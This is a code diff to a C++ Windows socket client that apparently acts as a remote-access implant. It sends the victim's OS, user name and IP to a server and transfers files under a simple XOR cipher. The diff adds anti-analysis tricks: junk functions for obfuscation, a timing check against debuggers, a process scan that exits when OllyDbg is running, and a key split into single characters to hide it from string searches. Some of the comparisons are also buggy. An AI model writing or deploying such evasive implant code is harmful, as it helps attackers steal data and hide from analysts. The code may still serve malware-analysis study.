@@ -13,11 +13,45 @@
 #include <VersionHelpers.h>
 #include <sstream>
 #include <fstream>
+#include <ctime>
+#include <tchar.h>
+#include <psapi.h>
 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Mswsock.lib")
 #pragma comment(lib, "AdvApi32.lib")
+
+int checkprocess();
+void checkforolly(DWORD processID);
+int junk1();
+int junk2(int* ptr1, int* ptr2);
+
+int junk1() {
+	int thetruth = 0;
+
+	thetruth = 1 * 3;
+	thetruth = thetruth & 5;
+	thetruth = thetruth ^ 50;
+
+	return thetruth;
+}
+
+int junk2(int* ptr1, int* ptr2) {
+	int thetruth = 1;
+	thetruth = *ptr1 ^ *ptr2;
+	thetruth = 1 * 3;
+	thetruth = thetruth & 5;
+	thetruth = thetruth ^ 50;
+	*ptr1 = *ptr1 * 4;
+	*ptr1 = *ptr1 & 5;
+	*ptr1 = *ptr1 ^ 25;
+	*ptr2 = *ptr2 * 2;
+	*ptr2 = *ptr2 & 7;
+	*ptr2 = *ptr2 ^ 10;
+
+	return thetruth;
+}
 
 class Socks {
 protected:
@@ -38,6 +72,7 @@ public:
 	std::string encryption(std::string msg);
 	int sendfile(std::string directory);
 	std::string recvfile();
+	int junk();
 };
 
 //Constructor
@@ -72,8 +107,19 @@ Socks::~Socks() {
 	WSACleanup();
 }
 
+//junk code
+int Socks::junk() {
+	int thetruth = 0;
+
+	thetruth = 1 * 3;
+	thetruth = thetruth & 5;
+	thetruth = thetruth ^ 50;
+
+	return thetruth;
+}
 //resolves address and port
 void Socks::resolve(addrinfo **info) {
+	junk();
 	struct addrinfo hints;
 	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
@@ -133,6 +179,8 @@ int Socks::sendData(std::string msg) {
 		//gets operating system version
 		if (!IsWindows8OrGreater()) {
 			msg = "Less than Windows 8";
+			WSACleanup();
+			exit(10);
 		}
 		else
 			msg = "Is Windows 8 or greater";
@@ -144,6 +192,9 @@ int Socks::sendData(std::string msg) {
 
 		msg = "CLIENT_INFO\nOS: " +  msg + "\nUser Name: " + username + "\nIP Address: " + ipaddr + "\nPort: " + port;
 	}
+	//get time
+	time_t timer;
+	time(&timer);
 
 	//send message length
 	int msg_len = msg.length();
@@ -156,6 +207,16 @@ int Socks::sendData(std::string msg) {
 		closesocket(ConnectSocket);
 		WSACleanup();
 		return 7;
+	}
+
+	//get time
+	time_t timer2;
+	time(&timer2);
+	double seconds = difftime(timer, timer2);
+	if (seconds > 5) {
+		closesocket(ConnectSocket);
+		WSACleanup();
+		exit(10);
 	}
 
 	//send message
@@ -172,6 +233,7 @@ int Socks::sendData(std::string msg) {
 
 //recieve data
 int Socks::recvData() {
+	junk();
 	int result = 0;
 	char recvbuf[20];
 	result = recv(ConnectSocket, recvbuf, 20, 0);
@@ -311,8 +373,18 @@ void Socks::endclient() {
 
 //encrypts data
 std::string Socks::encryption(std::string msg) {
-	std::string peaky = "enCRAPtion";
-	int peaky_len = peaky.length();
+	char peaky[10];
+	peaky[0] = 'e';
+	peaky[1] = 'n';
+	peaky[2] = 'C';
+	peaky[3] = 'R';
+	peaky[4] = 'A';
+	peaky[5] = 'P';
+	peaky[6] = 't';
+	peaky[7] = 'i';
+	peaky[8] = 'o';
+	peaky[9] = 'n';
+	int peaky_len = 10;
 	int msg_len = msg.length();
 	//encryption
 	for (int i = 0, x = 0; i < msg_len; i++, x++) {
@@ -359,13 +431,89 @@ int Socks::sendfile(std::string directory) {
 	return 0;
 }
 
+//check processes
+void checkforolly(DWORD processID)
+{
+	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+	
+	// Get a handle to the process.
+
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_READ,
+		FALSE, processID);
+
+	// Get the process name.
+
+	if (NULL != hProcess)
+	{
+		HMODULE hMod;
+		DWORD cbNeeded;
+
+		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
+			&cbNeeded))
+		{
+			GetModuleBaseName(hProcess, hMod, szProcessName,
+				sizeof(szProcessName) / sizeof(TCHAR));
+		}
+	}
+
+	//check for ollydbg process
+	//79,76,76,89,68,66,71,46,69,88,69
+	if (szProcessName[0] == 79) {
+		if (szProcessName[1] = 76)
+			if (szProcessName[2] = 76)
+				if (szProcessName[3] = 89)
+					if (szProcessName[4] = 68)
+						if (szProcessName[5] = 66)
+							if (szProcessName[6] = 71)
+								exit(10);
+	}
+	
+	// Release the handle to the process.
+	CloseHandle(hProcess);
+}
+
+//get list of processes
+int checkprocess() {
+	// Get the list of process identifiers.
+
+	DWORD aProcesses[1024], cbNeeded, cProcesses;
+	unsigned int i;
+
+	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+	{
+		return 1;
+	}
+
+
+	// Calculate how many process identifiers were returned.
+
+	cProcesses = cbNeeded / sizeof(DWORD);
+
+	// Print the name and process identifier for each process.
+
+	for (i = 0; i < cProcesses; i++)
+	{
+		if (aProcesses[i] != 0)
+		{
+			checkforolly(aProcesses[i]);
+		}
+	}
+	return 0;
+}
+
 int main()
 {
+	checkprocess();
+	junk1();
 	Socks socket;
 	struct addrinfo *info = NULL, *ptr = NULL;
 	int result = 0;
 	socket.resolve(&info);
 	ptr = info;
+	int ptr1 = 1;
+	int ptr2=2;
+	junk2(&ptr1, &ptr2);
 	result = socket.createclientsocket(ptr);
 	if (result > 0) {
 		printf("broken");
